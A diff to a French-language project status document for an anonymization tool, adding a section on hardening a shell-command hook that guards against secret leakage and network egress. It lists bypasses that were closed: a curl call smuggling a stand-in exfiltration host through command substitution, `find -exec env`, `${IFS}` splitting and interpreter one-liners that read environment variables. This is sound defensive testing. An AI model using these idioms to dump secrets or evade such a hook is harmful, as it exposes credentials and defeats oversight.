@@ -68,7 +68,7 @@ hooks pour la réversibilité · anonymize en serveur MCP « volontaire » ·
 SCIM/RBAC dans le MVP · valider sans capture egress complète.
 
 ## État des phases
-**538 tests verts** (520 + 18 egress) : `uv run pytest tests/ --ignore=tests/egress`
+**583 tests verts** (565 + 18 egress) : `uv run pytest tests/ --ignore=tests/egress`
 puis `uv run pytest tests/egress/test_report.py`.
 
 | Phase | État | Preuve |
@@ -221,6 +221,32 @@ valeur.
 **Limite documentée** : un nom de paramètre de query sans point, arobase ni
 deux-points (`?db-01=`, `?jdoe=`) n'est pas substitué — indiscernable d'un nom
 d'API. Le seul vrai correctif serait de soumettre chaque nom au détecteur.
+
+### Hook — round 4 (même passe, agent dédié)
+Deux régressions de ma réécriture du round 3, exploitables avec des idiomes
+shell standards, sans obfuscation :
+- **La sortie d'une substitution est un ARGUMENT.** Je remplaçais la région
+  imbriquée par un BLANC après l'avoir analysée : `curl http://127.0.0.1/
+  $(echo http://exfil.test/x)` ne montrait plus qu'une URL locale, et
+  `$(echo env)` ne montrait plus rien. Elle est désormais remplacée par un
+  jeton OPAQUE : en position de programme il refuse, et un binaire réseau qui
+  en reçoit un ne peut plus prouver que sa destination est locale.
+- **`find … -exec env \;`** — la règle `-exec` existait mais était morte :
+  `find` n'est pas une enveloppe, l'analyse s'arrêtait dessus avant de
+  l'atteindre. Le balayage `-exec` est maintenant séparé de la boucle.
+
+Autres trous fermés : deux listes de noms sensibles divergeaient
+(`echo $DATABASE_URL` passait quand `printenv DATABASE_URL` était refusé) —
+une seule liste désormais · programme d'interpréteur donné EN LIGNE inspecté
+mot à mot, ce qui couvre d'un coup `system "env"` sans parenthèses, `qx/env/`,
+`%x[env]`, `subprocess.run(("env",))`, `getstatusoutput`, `process["env"]`,
+`from os import environ`, `getattr(os, "environ")` · `${IFS}` retiré quelle que
+soit sa position (`env${IFS}> dump`) · `${!x}` résolu via l'affectation qui le
+précède · `strace`/`ltrace` reconnus comme enveloppes.
+
+Faux positifs corrigés : `printenv AWS_REGION` était refusé quand
+`echo $AWS_REGION` passait · `openssl rand|dgst|passwd|enc|x509` et
+`--version`/`-V` n'ouvrent aucune connexion.
 
 ## Défauts corrigés dans `anthropic_walker.py` (règle 6 — tests fournis AVANT)
 `tests/test_walker_defects.py` prouve les quatre, corrections minimales
